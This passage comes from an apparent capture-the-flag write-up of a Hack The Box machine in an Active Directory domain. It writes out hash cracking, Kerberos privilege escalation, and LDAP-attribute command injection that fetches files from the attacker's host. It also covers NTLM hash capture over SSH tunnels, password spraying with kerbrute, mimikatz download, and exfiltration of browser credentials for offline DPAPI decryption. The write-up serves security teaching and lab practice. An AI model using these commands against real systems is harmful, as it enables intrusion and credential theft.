hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
...[snip]...
$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81:pantera
...[snip]...

```

The password is “pantera”.

### root via Ray.Duncan

With Ray.Duncan’s password, I can try to get a ticket as that user on the domain with `kinit`:

```

webster@webserver:~$ kinit ray.duncan
Password for ray.duncan@WINDCORP.HTB: 

```

It seems to work, and now `klist` shows the ticket:

```

webster@webserver:~$ klist
Ticket cache: FILE:/tmp/.cache/krb5cc.5049
Default principal: ray.duncan@WINDCORP.HTB

Valid starting       Expires              Service principal
03/28/2023 22:30:39  03/29/2023 03:30:39  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 03/29/2023 22:30:36

```

`ksu` is a program that will try to get root privileges using Kerberos / AD as the arbitrator. I can run it to see if Ray.Duncan can escalate, and they can:

```

webster@webserver:~$ ksu
Authenticated ray.duncan@WINDCORP.HTB
Account root: authorization for ray.duncan@WINDCORP.HTB successful
Changing uid to root (0)
root@webserver:/home/webster#

```

`user.txt` is in `/root`:

```

root@webserver:~# cat user.txt
41bd824c************************

```

### SSH

To solidify my access, I’ll drop my public key into root’s `authorized_keys` file:

```

root@webserver:~/.ssh# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys

```

I’m able to connect as root to the VM now:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.179
Linux webserver 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64
...[snip]...
root@webserver:~#

```

## Shell as Bob.Wood on Sekhmet

### Enumeration

#### nmap

I’ll download a static compiled `nmap` from [this GitHub repo](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and upload it to webserver with `scp`. Now I can scan the DC to see what ports are open:

```

root@webserver:~# ./nmap -p- --min-rate 10000 192.168.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-28 22:54 CEST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for hope.windcorp.htb (192.168.0.2)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00080s latency).
Not shown: 65519 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd
636/tcp   open  ldaps
3268/tcp  open  unknown
3269/tcp  open  unknown
5985/tcp  open  unknown
9389/tcp  open  unknown
49664/tcp open  unknown
53242/tcp open  unknown
57477/tcp open  unknown
61378/tcp open  unknown
MAC Address: 00:15:5D:10:93:01 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds

```

This looks like a very standard DC. WinRM (5985) is open, which is worth nothing if I get more creds.

#### Tunnel

Because I have a Kerberos ticket (or can generate a new one running as root), I can try to connect to SMB and other services on the DC. Because `smbclient` isn’t on webserver, I’ll create a tunnel using my SSH connect. I’ll hit enter a couple times, then `~C` to drop into the SSH shell. `-D 1080` will open a SOCKS tunnel on my host on TCP 1080 that will forward through the SSH connection:

```

root@webserver:~# 
ssh> -D 1080
Forwarding port.

root@webserver:~#

```

#### Kerberos Auth

To get auth on my server, I need to set up Kerberos to get a ticket through the proxy. I’ll edit my `/etc/krb5.conf` file to be:

```

[libdefaults]
	default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = { 
      kdc = hope.windcorp.htb
    }

[domain_realm]
	.windcorp.htb = WINDCORP.HTB
	windcorp.htb = WINDCORP.HTB

```

Case matters here! Now I can `kinit` from my host:

```

oxdf@hacky$ proxychains kinit ray.duncan
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK
Password for ray.duncan@WINDCORP.HTB: 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ray.duncan@WINDCORP.HTB

Valid starting       Expires              Service principal
03/28/2023 17:33:09  03/28/2023 22:33:09  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 03/29/2023 17:33:03

```

If DNS is having trouble getting through the proxy, I’ll disable that in `/etc/proxychains.conf` and add `hope.windcorp.htb` to my `/etc/hosts` file as 192.168.0.2.

#### SMB

Now I can enumeration SMB just like I would on a fresh box, but I’ll add `-k` to use Kerberos auth. There are six shares, five of which are standard on a DC:

```

oxdf@hacky$ proxychains smbclient -k -L //hope.windcorp.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
WARNING: The option -k|--kerberos is deprecated!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb.:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb.:88  ...  OK

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        WC-Share        Disk      
SMB1 disabled -- no workgroup available

```

`WC-Share` is unique to this domain, so I’ll connect to that:

```

oxdf@hacky$ proxychains smbclient -k //hope.windcorp.htb/WC-Share
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
WARNING: The option -k|--kerberos is deprecated!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:88  ...  OK
Try "help" to get a list of possible commands.
smb: \>

```

It has a single folder, `temp`:

```

smb: \> ls
  .                                   D        0  Mon May  2 06:33:07 2022
  ..                                DHS        0  Sat Mar 25 17:56:06 2023
  temp                                D        0  Tue Mar 28 20:46:29 2023

                9801727 blocks of size 4096. 3394530 blocks available

```

That has a single file, `debug-users.txt`:

```

smb: \temp\> ls
  .                                   D        0  Tue Mar 28 20:46:29 2023
  ..                                  D        0  Mon May  2 06:33:07 2022
  debug-users.txt                     A       88  Tue Mar 28 20:46:29 2023

                9801727 blocks of size 4096. 3394530 blocks available
smb: \temp\> get debug-users.txt 
getting file \temp\debug-users.txt of size 88 as debug-users.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

The file has four potential usernames:

```

oxdf@hacky$ cat debug-users.txt 
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncan9342211

```

I’ll notice that RayDuncan is in the list.

I’ll also check the other shares. `NETLOGON` typically holds logon scripts and other files.

```

oxdf@hacky$ proxychains smbclient -k //hope.windcorp.htb/NETLOGON
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
WARNING: The option -k|--kerberos is deprecated!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:88  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May  2 03:49:18 2022
  ..                                  D        0  Mon Apr 25 16:59:55 2022
  form.ps1                            A     2124  Mon May  2 02:47:14 2022
  Update phone.lnk                    A     2710  Mon May  2 02:37:33 2022
  windcorp-logo.png                   A    47774  Sun May  1 17:45:04 2022

                9801727 blocks of size 4096. 3394530 blocks available

```

I’ll download all three files:

```

smb: \> get "Update phone.lnk"
getting file \Update phone.lnk of size 2710 as Update phone.lnk (7.6 KiloBytes/sec) (average 7.6 KiloBytes/sec)
smb: \> get form.ps1 
getting file \form.ps1 of size 2124 as form.ps1 (6.0 KiloBytes/sec) (average 6.8 KiloBytes/sec)
smb: \> get windcorp-logo.png 
getting file \windcorp-logo.png of size 47774 as windcorp-logo.png (108.2 KiloBytes/sec) (average 45.8 KiloBytes/sec)

```

### Mobile Attributes

#### form.ps1 Script Analysis

`form.ps1` generates a GUI form that a`mobile` attribute in the LDAP data. There’s a bunch of GUI generation, and at the end:

```

if ($result -eq [System.Windows.Forms.DialogResult]::OK)                                                 
{                                                   
    $x = $textBox.Text                              
    $User.Put("mobile",$x)                          
    $User.SetInfo()                                 
}  

```

It’s not clear that this is running or anything, but it does point a finger at `mobile` numbers.

#### Modify

I’ll try modifying Ray Duncan’s `mobile` attribute in LDAP. I have the full key for the user from the LDB above: `CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB`.

I can make the change with `ldapmodify`, which is on webserver:

```

root@webserver:~# echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: 223223223'
dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB
changetype: modify
replace: mobile
mobile: 223223223
root@webserver:~# echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: 223223223' | ldapmodify -H ldap://hope.windcorp.htb
SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB"

```

A couple minutes later, the entry for RayDuncan has updates in `debug-users.txt`:

```

IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncan223223223

```

#### Setup

This next step was a pain. It takes a lot of trial and error, and each time you submit, it takes two full minutes for the cron to run. I set up with a SSH in the lower terminal in my tmux window, and a terminal up top that is running `watch`. `watch` will run a given command every X seconds (2 by default) and print the output to the screen, updating whatever changes between runs.

My `watch` command runs a few commands to:
- delete `debug-users.txt` (so that if the next commands fail, I notice)
- connect over SMB and get `debug-users.txt`
- `cat debug-users.txt`

The full command is `watch -n 10 -d "rm debug-users.txt; proxychains smbclient -k //hope.windcorp.htb/WC-Share -c 'get temp/debug-users.txt debug-users.txt'; cat debug-users.txt`, and the result is these windows with the top updating every 10 seconds with the contents of `debug-users.txt` as I update LDAP via the bottom::

![image-20230329084237998](/img/image-20230329084237998.png)

#### Command Injection

I know that changes in the `mobile` attribute in AD lead to changes in `debug-users.txt`. There must be some kind of script processing these changes (every two minutes) and writing to a file. I’ll check for command injection by setting ray.duncan’s `mobile` attribute to `$(whoami)`:

```

root@webserver:~# echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(ping 10.10.14.6)' | ldapmodify -H ldap://hope.windcorp.htb
SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB"

```

When it updates, the result shows command injection:

```

RayDuncanwindcorp\scriptrunner

```

### Auth as scriptrunner

#### ping

I’ll check if script running can ping my VM by setting `mobile` to `$(ping 10.10.14.6)`. When it runs, I get ICMP:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:48:18.764230 IP 10.10.11.179 > 10.10.14.6: ICMP echo request, id 1, seq 5, length 40
08:48:18.764247 IP 10.10.14.6 > 10.10.11.179: ICMP echo reply, id 1, seq 5, length 40
08:48:19.767311 IP 10.10.11.179 > 10.10.14.6: ICMP echo request, id 1, seq 6, length 40
08:48:19.767329 IP 10.10.14.6 > 10.10.11.179: ICMP echo reply, id 1, seq 6, length 40
08:48:20.773787 IP 10.10.11.179 > 10.10.14.6: ICMP echo request, id 1, seq 7, length 40
08:48:20.773820 IP 10.10.14.6 > 10.10.11.179: ICMP echo reply, id 1, seq 7, length 40
08:48:21.780679 IP 10.10.11.179 > 10.10.14.6: ICMP echo request, id 1, seq 8, length 40
08:48:21.780718 IP 10.10.14.6 > 10.10.11.179: ICMP echo reply, id 1, seq 8, length 40

```

And the results are in `debug-users.txt`:

```

RayDuncan Pinging 10.10.14.6 with 32 bytes of data: Reply from 10.10.14.6: bytes=32 time=85ms TT
L=63 Reply from 10.10.14.6: bytes=32 time=86ms TTL=63 Reply from 10.10.14.6: bytes=32 time=85ms
TTL=63 Reply from 10.10.14.6: bytes=32 time=85ms TTL=63  Ping statistics for 10.10.14.6:     Pac
kets: Sent = 4, Received = 4, Lost = 0 (0% loss), Approximate round trip times in milli-seconds:
     Minimum = 85ms, Maximum = 86ms, Average = 85ms

```

#### Web Requests - Rabbit Hole

I’ll to get a web request back to my host with `$(curl 10.10.14.6/d -outfile \programdata\d)`. It works (I have a dummy file with a string at `d` on my server):

```
10.10.11.179 - - [29/Mar/2023 09:31:49] "GET /d HTTP/1.1" 200 -

```

I’ll update `mobile` to read that file, and it works:

```

RayDuncan0xdf was here!

```

I’ll serve `nc64.exe` and upload it. It seems to go fine. However, I’m not able to get it to connect back to me or to a `nc` listening on webserver. It seems likely that AppLocker is blocking the scriptrunner user from running `nc64.exe`.

#### SMB

I’ll try to get scriptrunner to connect back to my host over SMB to collect a Net-NTLMv2 hash (really a challenge / response). But it doesn’t work. It could be a firewall, or perhaps that it’s a IP address not on the domain.

I am able to get it to connect to webserver. I’ll set Ray.Duncan’s `mobile` to `$(net use \\\\webserver.windcorp.htb\\df 2>&1)`, and then start `nc` on webserver listening on 445. When the task runs, there’s a connection:

```

root@webserver:~# nc -lnvp 445
listening on [any] 445 ...
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.2] 53086
ESMBrS"NT LM 0.12SMB 2.002SMB 2.???

```

In order to get a hash from that, I’ll either need to start an SMB server on webserver, or tunnel the connection back to my host. I’ll opt for the latter.

I’ll need to enable remote tunneling in `/etc/ssh/sshd_config`. Otherwise, I’ll only be able to listen on local host. As root, I can do this. I’ll find this line, uncomment it, and change the `no` to `yes`:

```

GatewayPorts yes

```

Now I’ll restart SSH (`service sshd restart`) and reconnect with the additional tunnel:

```

oxdf@hacky$ sudo ssh -i ~/keys/ed25519_gen root@10.10.11.179 -D 1080 -R 0.0.0.0:445:127.0.0.1:445

```

`-R 0.0.0.0:445:127.0.0.1:445` tells SSH to open a listening port on TCP 445 on all interfaces of webserver and forward anything that arrives through SSH to my VM on 445.

I’ll start a Python SMB server, and wait for the next script to run. When it runs, I get the authentication challenge hash:

```

oxdf@hacky$ smbserver.py df . -smb2support
Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,43742)
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] AUTHENTICATE_MESSAGE (WINDCORP\scriptrunner,HOPE)
[*] User HOPE\scriptrunner authenticated successfully
[*] scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:6dd2c5e5c955c4c1cca2e607ad348780:010100000000000080d9d3256562d901ca489555c34ca84900000000010010004a004a004c0071006c006a0041007a00030010004a004a004c0071006c006a0041007a0002001000720067004a0051004e004f006e00530004001000720067004a0051004e004f006e0053000700080080d9d3256562d90106000400020000000800300030000000000000000000000000210000576df55fb1b06b759344eaa6a4f173aa9bc17ec674ccf9c00d373489b7ca95260a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
[*] Closing down connection (127.0.0.1,43742)
[*] Remaining connections []

```

#### Crack Net-NTLMv2

I’ll save that into a file and crack it with `hashcat`:

```

$ hashcat scriptrunner.netntlmv2 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
SCRIPTRUNNER::WINDCORP:aaaaaaaaaaaaaaaa:6dd2c5e5c955c4c1cca2e607ad348780:010100000000000080d9d3256562d901ca489555c34ca84900000000010010004a004a004c0071006c006a0041007a00030010004a004a004c0071006c006a0041007a0002001000720067004a0051004e004f006e00530004001000720067004a0051004e004f006e0053000700080080d9d3256562d90106000400020000000800300030000000000000000000000000210000576df55fb1b06b759344eaa6a4f173aa9bc17ec674ccf9c00d373489b7ca95260a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000:!@p%i&J#iNNo1T2
...[snip]...

```

It breaks in about 35 seconds with `rockyou.txt` to “!@p%i&J#iNNo1T2”.

### Creds for Bob.Wood

#### Dead End

There’s not much I can do with these creds. I’ll run `kinit scriptrunner`, but it doesn’t give much. I can `ldapsearch` to see information about scriptrunner:

```

root@webserver:~# ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" 
...[snip]...
# scriptrunner, Users, windcorp.htb                                 
dn: CN=scriptrunner,CN=Users,DC=windcorp,DC=htb
objectClass: top                                                    
objectClass: person                                                 
objectClass: organizationalPerson                                   
objectClass: user                 
cn: scriptrunner                                                    
givenName: scriptrunner
distinguishedName: CN=scriptrunner,CN=Users,DC=windcorp,DC=htb
...[snip]...

```

It’s just a plain user. Nothing interesting. Can’t WinRM.

#### Password Spray

This is an account that is running scripts, rather than being associated with a user. It’s worth checking to see if any other users use the same password.

I’ll get a list of users with `ldapsearch` on webserver and save it to a file, capturing almost 600 users:

```

root@webserver:~# ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName "CN=Users,DC=windcorp,DC=HTB" | grep sAMAccountName | awk '{print $2}' > domainusers 
SASL/GSS-SPNEGO authentication started
SASL username: scriptrunner@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
root@webserver:~# wc -l domainusers 
597 domainusers

```

I’ll download the latest [Kerbrute release](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) and upload it to webserver with `scp`. Because it’s a Go binary, all dependencies are packaged with it so it will run fine on the VM. I’ll run it:

```

root@webserver:~# ./kerbrute passwordspray -d windcorp.htb domainusers '!@p%i&J#iNNo1T2'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/29/23 - Ronnie Flathers @ropnop

2023/03/29 20:42:10 >  Using KDC(s):
2023/03/29 20:42:10 >   hope.windcorp.htb:88

2023/03/29 20:42:11 >  [+] VALID LOGIN:  Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
2023/03/29 20:42:16 >  [+] VALID LOGIN:  scriptrunner@windcorp.htb:!@p%i&J#iNNo1T2
2023/03/29 20:42:16 >  Done! Tested 597 logins (2 successes) in 5.951 seconds

```

It finds both scriptrunner and Bob.Wood using that password!

### WinRM

#### Enumerate Bob.Wood

`ldapsearch` shows that Bob.Wood is an admin user:

```

root@webserver:~# ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB"
...[snip]...
# Bob Wood, IT, windcorp.htb
dn: CN=Bob Wood,OU=IT,DC=windcorp,DC=htb
objectClass: top
objectClass: person                                 
objectClass: organizationalPerson
objectClass: user
cn: Bob Wood
sn: Wood
givenName: Bob
distinguishedName: CN=Bob Wood,OU=IT,DC=windcorp,DC=htb
instanceType: 4
whenCreated: 20220430082545.0Z
whenChanged: 20220822121712.0Z
uSNCreated: 124353                                  
memberOf: CN=Adminusers,OU=Groups,DC=windcorp,DC=htb
memberOf: CN=IT,OU=Groups,DC=windcorp,DC=htb
...[snip]...

```

This makes it likely that I can WinRM as Bob.Wood.

#### Evil-WinRM

I’ll get a ticket as Bob.Wood:

```

oxdf@hacky$ proxychains kinit bob.wood
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:88  ...  OK
Password for bob.wood@WINDCORP.HTB: 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:88  ...  OK

```

Now I’ll connect using `proxychains` to get into the 192.168.0.0/24 network, and `-r windcorp.htb` to specify the Kerberos realm to connect to. I must use the DC hostname as the “IP” for Kerberos auth to work.

```

oxdf@hacky$ proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents>

```

`user.txt` (the same as before) is on Bob.Wood’s desktop.

## Shell as Bob.WoodADM

### Enumeration

#### Users

Despite having some administrator looking groups, Bob is not administrator on Sekhmet. There are a few other users:

```
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/16/2022   2:40 PM                Administrator
d-----          5/4/2022   7:17 PM                Bob.Wood
d-r---         4/28/2022  10:55 PM                Public
d-----          9/5/2022   4:17 PM                scriptrunner

```

#### DPAPI

One very common thing to look for on pentests is DPAPI, the Windows OS method for encrypting and storing keys and passwords. Items (known as “blobs”) are encrypted using symmetric crypto with a key generated from the password/NLTM hash and SID. I showed one way to abuse this technique before in [Access](/2019/03/02/htb-access.html#privesc-2---dpapi-creds).

[This page](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) from HackTricks has a really good background on it. The DPAPI blobs are stored in `C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\{SID}\`. A bunch of these folders are hidden, and will now show up unless I add `-force` to my PowerShell `gci`/`ls`/etc command.

There is a SID in the `Protect` directory:

```
*Evil-WinRM* PS C:\Users\Bob.Wood> gci -force AppData\Roaming\Microsoft\Protect\

    Directory: C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         8/22/2022   2:17 PM                S-1-5-21-1844305427-4058123335-2739572863-2761
-a-hs-          5/4/2022   4:49 PM             24 CREDHIST
-a-hs-         8/24/2022   1:41 PM             76 SYNCHIST

```

There’s a couple keys there (the 740 byte files named by a GUID):

```
*Evil-WinRM* PS C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761> ls -force

    Directory: C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         8/22/2022   2:17 PM            740 3ebf1d50-8f5c-4a75-9203-20347331bad8
-a-hs-          5/4/2022   4:49 PM            740 a8bd1009-f2ac-43ca-9266-8e029f503e11
-a-hs-          5/4/2022   4:49 PM            908 BK-WINDCORP
-a-hs-         8/22/2022   2:17 PM             24 Preferred

```

`C:\users\bob.wood\AppData\Roaming\Microsoft\Credentials` is empty, so no system level keys stored here. Another thing DPAPI is used for is storing browser saved creds. And Bob.Wood has some of those in the Edge directory:

```
*Evil-WinRM* PS C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default> ls "Login Data"

    Directory: C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/4/2022   7:46 PM          55296 Login Data

```

### DPAPI Strategy

#### Mimikatz Upload Fail

The most famous way to decrypt DPAPI is with Mimikatz. I’ll upload the latest [mimikatz release](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919) to Sekhmet by hosting it on a webserver on my machine (no shown), and fetching it with `irw`:

```
*Evil-WinRM* PS C:\programdata> iwr http://10.10.14.6/x64/mimikatz.exe -outfile m.exe     
*Evil-WinRM* PS C:\programdata> ls m.exe

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/29/2023   9:20 PM        1355264 m.exe

```

However, when I try to run it, it won’t run:

```
*Evil-WinRM* PS C:\programdata> .\m.exe
Program 'm.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .\m.exe
+ ~~~~~~~.
At line:1 char:1
+ .\m.exe
+ ~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

This feels like AppLocker. I’ll try moving it to a classic AppLocker bypass directory, but still no:

```
*Evil-WinRM* PS C:\programdata> move m.exe \windows\system32\spool\drivers\color\
*Evil-WinRM* PS C:\programdata> \windows\system32\spool\drivers\color\m.exe
Program 'm.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ \windows\system32\spool\drivers\color\m.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ \windows\system32\spool\drivers\color\m.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

#### Strategy Forward

There are a few approaches I could take here. I can try to find a way to get around AppLocker. The intended path for this box is to enumerate the AppLocker rules and notice that while most the LOLBins are blocked, there two versions of `InstallUtil.exe` on the box, and only one is blocked. From there, I could write a .NET binary to continue, escaping from PowerShell constrained language mode, and running the PowerShell version of Mimikatz to get the DPAPI passwords..

I’ll explore two easier paths.

The first is to download the necessary files and run the decryption offline. I thought this would be trivial, but it did end up taking much longer than I expected, as `Mimikatz` isn’t configured for this path, and other tools I tried weren’t working. Shoutout to szymex73 who suggested `pypykatz`, which is awesome!

The other way I’ll show is to find a world-writable directory that isn’t blocked by AppLocker, and run SharpChromium from there (I suspect Mimikatz would work here too, but I wanted to show off a different tool).

### DPAPI Offline [Method 1]

#### Exfil Edge Data

My initial thought was that rather than try to bypass protections, I’ll just exfil the files I need and decrypt offline. I’ll need two files from the Edge directory, `Local State` and `Login Data`.

`Local State` is a text JSON file in `C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data`, which I can copy to my clipboard and paste into a file on my VM.

`Login Data` is a binary file (actually a SQLite DB). PowerShell is actually in Constrained Language mode, which prevents the syntax required to base64 encode, so I’ll use `certutil`:

```
*Evil-WinRM* PS C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default> certutil -encode "Login Data" \programdata\logindata
Input Length = 55296
Output Length = 76088
CertUtil: -encode command completed successfully. 
*Evil-WinRM* PS C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default> type \programdata\logindata
-----BEGIN CERTIFICATE-----
U1FMaXRlIGZvcm1hdCAzAAgAAQEAQCAgAAAAAgAAABsAAAAAAAAAAAAAABAAAAAE
AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
AC5bMAUAAAABB/sAAAAAEAf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
...[snip]...

```

The output is quite long, but I can grab it using the TMUX techniques that [IppSec shows in this video](https://www.youtube.com/watch?v=Lqehvpe_djs&t=363s). Once I paste that back on my box, I can decode it and have the file:

```

oxdf@hacky$ file logindata 
logindata: SQLite 3.x database, last written using SQLite version 3038000, page size 2048, file counter 2, database pages 27, cookie 0x10, schema 4, UTF-8, version-valid-for 2

```

#### Edge Data Overview

`Local Data` is a SQLite DB, with a handful of tables:

```

oxdf@hacky$ sqlite3 logindata
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
breached                logins_edge_extended    sync_entities_metadata
field_info              meta                    sync_model_metadata   
insecure_credentials    password_notes        
logins                  stats   

```

The `logins` table is where passwords are saved:

```

sqlite> .headers on
sqlite> select origin_url,username_value,password_value from logins;
origin_url|username_value|password_value
http://somewhere.com/login.html|bob.wood@windcorp.htb|v109?]2y1eOONtx#5mmЂmX=t
http://google.com/login.html|bob.wood@windcorp.htb|v10]HN/g%{g?h5PK Ff&ܷxu
http://webmail.windcorp.com/login.html|bob.woodADM@windcorp.com|v10iu25ƴ-'>lt<R>ȄakkmH

```

The passwords are encrypted. The key to decrypt them is saved in `Local State`:

```

oxdf@hacky$ cat localstate | jq -r .os_crypt.encrypted_key 
